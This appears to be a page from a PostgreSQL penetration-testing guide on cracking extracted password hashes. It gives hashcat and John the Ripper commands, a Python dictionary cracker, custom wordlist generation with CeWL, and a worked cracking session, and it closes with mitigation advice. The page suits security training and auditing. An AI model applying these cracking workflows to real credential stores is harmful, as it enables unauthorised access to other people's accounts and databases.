---
title: Password Cracking
description: Techniques to recover passwords from PostgreSQL hashes
category: Advanced Techniques
order: 20
tags: ["password", "cracking", "hashcat", "john"]
lastUpdated: 2025-12-16
---

## Password Cracking

Once you've extracted PostgreSQL password hashes, you can attempt to recover the plaintext passwords using various cracking techniques.

### MD5 Hash Cracking

PostgreSQL MD5 format: `md5<32 hex characters>`

The hash is: `MD5(password + username)`

#### Using Hashcat

```bash
# Hash format: hash:username (strip "md5" prefix, username is salt)
# Example: d578ec61fc8a2bdbe7df2c3096b34e02:postgres

# Hashcat mode 12 for PostgreSQL
hashcat -m 12 -a 0 hash.txt wordlist.txt

# With rules
hashcat -m 12 -a 0 hash.txt wordlist.txt -r rules/best64.rule
```

#### Using John the Ripper

```bash
# Format: username:$dynamic_1$<32-hex-hash>$username
# Strip "md5" prefix, username is the salt

# Create hash file (dynamic_1 = MD5(password + username))
echo 'postgres:$dynamic_1$d578ec61fc8a2bdbe7df2c3096b34e02$postgres' > postgres_hash.txt

# Run John
john --format=dynamic_1 postgres_hash.txt
```

#### Manual Python Cracker

```python
import hashlib

def crack_postgres_md5(username, hash_value, wordlist):
    """Crack PostgreSQL MD5 password hash"""
    # Remove 'md5' prefix if present
    if hash_value.startswith('md5'):
        hash_value = hash_value[3:]

    with open(wordlist, 'r') as f:
        for password in f:
            password = password.strip()
            test_hash = hashlib.md5((password + username).encode()).hexdigest()
            if test_hash == hash_value:
                return password
    return None

# Usage
username = 'postgres'
hash_val = 'md5d578ec61fc8a2bdbe7df2c3096b34e02'
result = crack_postgres_md5(username, hash_val, '/usr/share/wordlists/rockyou.txt')
```

### SCRAM-SHA-256 Cracking

SCRAM-SHA-256 is significantly harder to crack.

Format: `SCRAM-SHA-256$<iterations>:<salt>$<StoredKey>:<ServerKey>`

#### Using Hashcat

```bash
# Hashcat mode 28600 for SCRAM-SHA-256
# Format: SCRAM-SHA-256$4096:salt$storedkey:serverkey

hashcat -m 28600 -a 0 scram_hash.txt wordlist.txt
```

#### Using John the Ripper

```bash
# John supports SCRAM-SHA-256 with the right format
john --format=postgres-scram scram_hash.txt
```

### Rainbow Tables

For MD5 hashes, rainbow tables can be used, but PostgreSQL's salting with username makes this less effective:

```bash
# Traditional rainbow tables won't work directly
# because the hash is MD5(password + username)
# You'd need username-specific tables
```

### Online Hash Databases

For weak passwords, online databases may have precomputed hashes:

- CrackStation
- HashKiller
- MD5Decrypt

**Note:** PostgreSQL MD5 hashes include username, so generic MD5 lookups won't work.

### Wordlist Resources

Common wordlists for password cracking:

| Wordlist     | Description                      |
| ------------ | -------------------------------- |
| rockyou.txt  | Classic leaked password list     |
| SecLists     | Comprehensive security wordlists |
| CrackStation | Human passwords list             |
| Custom       | Generated based on target info   |

### Creating Custom Wordlists

```bash
# Generate variations with hashcat rules
hashcat --stdout -r rules/best64.rule base_words.txt > expanded.txt

# Use CeWL to create wordlist from website
cewl -d 2 -m 5 http://target.com -w custom_wordlist.txt

# Combine and deduplicate
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt
```

### Performance Tips

1. **Use GPU acceleration**: Hashcat with CUDA/OpenCL
2. **Start with common passwords**: Try top 1000 passwords first
3. **Use rules**: Hashcat rules expand wordlists efficiently
4. **Target-specific words**: Include company name, usernames, etc.
5. **Incremental attacks**: For short passwords, try brute force

### Example Cracking Session

```bash
# 1. Extract hash from database
# postgres:md5d578ec61fc8a2bdbe7df2c3096b34e02

# 2. Prepare hash file (strip "md5" prefix, format as hash:username)
echo 'd578ec61fc8a2bdbe7df2c3096b34e02:postgres' > pg_hash.txt

# 3. Quick dictionary attack
hashcat -m 12 -a 0 pg_hash.txt rockyou.txt

# 4. Dictionary with rules
hashcat -m 12 -a 0 pg_hash.txt rockyou.txt -r best64.rule

# 5. Brute force short passwords
hashcat -m 12 -a 3 pg_hash.txt ?a?a?a?a?a?a

# 6. Check results
hashcat -m 12 pg_hash.txt --show
```

### Notes

- MD5 hashes are relatively fast to crack
- SCRAM-SHA-256 uses iterations (default 4096) making it much slower
- Username is required to crack PostgreSQL MD5 hashes
- GPU cracking is significantly faster than CPU
- Consider the legal implications of password cracking

### Mitigation

To protect against password cracking:

1. Use SCRAM-SHA-256 authentication (PostgreSQL 10+)
2. Increase SCRAM iteration count
3. Enforce strong password policies
4. Use certificate-based authentication
5. Implement account lockout after failed attempts
